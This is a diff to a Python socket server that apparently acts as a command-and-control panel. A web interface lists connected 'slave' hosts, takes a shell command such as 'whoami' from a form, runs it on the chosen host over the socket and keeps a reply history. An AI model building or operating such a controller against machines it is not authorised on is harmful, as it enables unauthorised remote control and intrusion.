@@ -51,7 +51,6 @@ def _worker_process(worker_connection, client=None):
     port = process_socket.getsockname()[1]
     worker_connection.sendall(bytes(str(port).encode('utf-8')))
     process_socket.listen(1)
-    # import pdb; pdb.set_trace()
     process_connection, process_client_addr = process_socket.accept()
     while True:
         try:
@@ -94,13 +93,13 @@ while True:
         payload = b'whoami'
 
         connections = [conn for conn in connections if utilities._check_conn(conn)]
-        
+
         data = connection.recv(1024).decode('utf-8')
         if data.startswith('GET / '):
             # payload URLs: POST /b64<payload>?b64<host:port>
             # add payload input field
             print(f'Web interface Request data: << {data}')
-            with open('index.html') as file_:
+            with open('templates/index.html') as file_:
                 template = Template(file_.read())
             # check connections if actual/exclude web conns
             response = template.render(connections=connections)
@@ -111,15 +110,29 @@ while True:
         elif data.startswith('GET /favicon'):
             connection.sendall(b'HTTP/1.1 404 Not Found\r\n\r\n')
             connection.close()
-        elif data.startswith('GET /payload_'):
+        elif data.startswith('GET /worker_'):
+            print(f'Web interface Request data: << {data}')
+            host = data.split()[1][8:] #b64decode after /worker_
+            worker_connection = None
+            for conn in connections:
+                if conn['url'] == host:
+                    worker_connection = conn
+                    break
+            with open('templates/worker.html') as file_:
+                template = Template(file_.read())
+            # check connections if actual/exclude web conns
+            response = template.render(conn=worker_connection, history=worker_connection['history'])
+            connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
+            connection.send(response.encode('utf-8'))
+            connection.close()
+        elif data.startswith('POST /payload_'):
             # encode payload b64
             # payload: POST /b64<host:port>
-            # pdb.set_trace()
             # payload from textarea form input
             # maintain commands history
             history = []
-            host, payload = data.split()[1][9:].split('?payload=') #b64decode split(':')
-            payload = unquote_plus(payload)
+            host = data.split()[1][9:] #b64decode split(':')
+            payload = unquote_plus(data.split()[-1].split('payload=')[1])
             #host, port = base64.b64decode(host).decode('utf-8').split(':')
             worker_connection = None
             for conn in connections:
@@ -132,7 +145,7 @@ while True:
             response_data = worker_connection['conn'].recv(1024).decode('utf-8')
             worker_connection['history'].append(f'>>> {payload}<br/><<< {response_data}')
             print(f'Slave {host} reply: << {response_data}')
-            with open('index.html') as f:
+            with open('templates/worker.html') as f:
                 template = Template(f.read())
             response = template.render(conn=worker_connection, response=response_data, history=worker_connection['history'])
             connection.sendall(b'HTTP/1.1 200 OK\r\n\r\n')
